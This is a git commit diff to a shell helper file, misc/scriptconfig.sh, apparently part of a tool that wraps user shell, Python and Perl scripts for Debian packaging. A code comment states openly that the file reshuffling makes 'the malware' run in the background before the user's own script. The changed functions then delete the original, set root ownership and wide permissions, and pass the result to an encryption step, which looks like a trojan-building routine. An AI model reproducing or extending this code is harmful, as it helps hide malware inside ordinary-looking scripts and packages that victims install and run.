fcfce8b735d7ea05384af602bb4b06ff855a0d66
Victory Osikwemhe <zombieleetnca@gmail.com>
2016-12-10 12:49:44 +0100

    Modify the functions in this file to support changes in misc/debpackage.sh

--- misc/scriptconfig.sh
+++ misc/scriptconfig.sh
@@ -3,12 +3,17 @@ stripHashBang() {
     
     
     local regex="$1"
+    local fileExt="${2}"
     
     [[ -z "$regex" ]] && {
 	printf "%s\n" "Null arguments are not allowed"
 	exit 1
     }
-    
+
+
+    # We read the data to and fro so that the malware
+    # will start running in the background before the users script
+    ######################################################################
     while read fileContent;do
 	printf "%s\n" "${fileContent}" >> "${dirfile}"
     done < "${fileName}"
@@ -22,10 +27,10 @@ stripHashBang() {
     while read fileContent;do
 	printf "%s\n" "${fileContent}" >> "${fileName}"
     done < "${dirfile}"
-    
-    
-    echo "${dirfile}" "${fileName}"
+    #############################################################################
     mv "${dirfile}" "${fileName}"
+
+    [[ "${dirfile}" != "tempScript.sh" ]] && rm "${fileName}.${fileExt}"
     
     
     chown root:root ./*
@@ -37,23 +42,30 @@ scrConfig() {
     case ${fileExt} in
     sh)
 	_sh
+	
 	while read fileContents;do
+	    
 	    printf "%s\n" "${fileContents}" >> "${dirfile}"
+	    
 	done < "${fileName}"
-	echo "${dirfile}" "${fileName}"
+	
+	
 	mv "${dirfile}" "${fileName}"
+
+	[[ "${dirfile}" != "tempScript.sh" ]] && rm "${fileName}.${fileExt}"
+	
 	chown root:root ./*
 	chmod 775 ./*
 	crypt "shell script" "${CRYPT}"
 	;;
     py)
 	_py
-	stripHashBang "python"
+	stripHashBang "python" "${fileExt}"
 	crypt "python script" "${CRYPT}"
 	;;
     pl)
 	_pl
-	stripHashBang "perl"
+	stripHashBang "perl" "${fileExt}"
 	crypt "perl script" "${CRYPT}"
 	;;
     esac
